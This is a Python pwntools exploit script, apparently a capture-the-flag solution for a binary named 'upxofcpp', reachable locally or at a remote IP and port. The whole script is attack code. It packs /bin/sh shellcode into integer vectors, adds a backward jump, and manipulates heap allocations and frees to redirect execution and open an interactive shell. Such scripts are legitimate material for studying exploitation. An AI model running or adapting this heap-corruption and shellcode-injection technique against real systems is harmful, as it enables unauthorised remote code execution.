from pwn import *
import sys
import struct

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./upxofcpp")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
else:
	p = remote("34.92.121.149","10000")
	libc = ELF("./libc-2.23.so")

def menu(choice):
	p.sendlineafter("Your choice:",str(choice))

def add(index,size,int_list = [1]):
	menu(1)
	p.sendlineafter("Index:",str(index))
	p.sendlineafter("Size:",str(size))
	p.recvuntil("-1 to stop:")
	for i in range(len(int_list)):
		p.sendline(str(int_list[i]))
	p.recvuntil("1. Add a vec")

def free(index):
	menu(2)
	p.sendlineafter("vec index:",str(index))

def edit(index):
	menu(3)

def show(index):
	menu(4)
	p.sendlineafter("vec index:",str(index))
	
def i32(info):
	return struct.unpack("<i",info)[0]

def cal(code):
	info = asm(code)
	info = info.ljust(8,"\x90")
	return i32(info[:4]),i32(info[4:])

def cal2(sc,size = 0x22):
	padding = (len(sc)%4)*"\x90"
	sc = sc + padding
	payload = []
	for i in range(0,len(sc),4):
		payload.append(i32(sc[i:i+4]))
	while len(payload) != size:
		payload.append(0)
	return payload

#code_base = 0x555555554000
code_base = 0x7ffff7df4000
#code_base = 0x200000
def debugf():
	gdb.attach(p,"b *{b1}\nb *{b2}\nb *{b3}".format(b1 = hex(code_base + 0x1026),b2 = hex(code_base + 0x1844),b3 = hex(code_base + 0x16d0)))
	#gdb.attach(p,"b *{b1}\nb *{b2}".format(b1 = hex(code_base + 0x1324),b2 = hex(code_base + 0x1844)))

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
context.bits = 64
context.arch = "amd64"
sc = asm(shellcraft.sh())
#debugf()
numbers = 0x8
add(0,0x60,[-1])
add(1,0x60,[-1])
size = 0x22
payload = cal2(sc,size - 2)
code = "jmp $-{offset}".format(offset = size * 4 - 8)
p1,p2 = cal(code)
#payload = [0]*0x20
payload.append(p1)
payload.append(p2)
#payload.append(-1)
print payload,len(payload)
raw_input()
add(2,size,payload)
free(1)
add(3,0x190/4,[-1])
add(5,0x60,[-1])
free(0)
free(3)
add(4,0x500,[-1])
#free(1)
#debugf()
free(0)
p.interactive() 
